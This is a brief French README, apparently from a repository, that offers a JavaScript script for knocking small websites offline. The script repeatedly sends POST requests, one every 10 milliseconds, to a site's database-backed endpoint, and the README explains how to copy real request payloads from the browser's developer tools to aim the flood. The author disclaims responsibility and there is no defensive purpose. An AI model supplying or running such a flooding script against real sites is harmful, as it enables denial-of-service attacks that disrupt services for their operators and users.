# Script pour down des sites

Alors, ne vous attendez pas à down des gros sites, c'est vraiment pour les petits sites pas ouf

Je ne suis pas responsable de vos actes.

## La technique

La technique consiste à spam les requêtes php ou get tout simplement qui font une requête vers une base de donnée.

## Script pour la méthode POST

(pour les méthodes get vous avez juste à modifier un peu le code mais rien de compliqué)
```javascript
setInterval(function(){

    var xhr = new XMLHttpRequest();
    xhr.open("POST", "lien de la requête post", true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(JSON.stringify({
        payload: 'blablabla'
    }));

}, 10)

```
à la place de payload: 'blablabla' vous avez tout simplement à mettre les valeurs du payload envoyé, visible dans Inspecter élément -> Network -> (faites la requête) -> puis vous cliquez dessus et vous verrez tout ça dans Payload

## Support
Je ne ferai pas de support pour ce repo.

## License
[MIT](https://choosealicense.com/licenses/mit/)
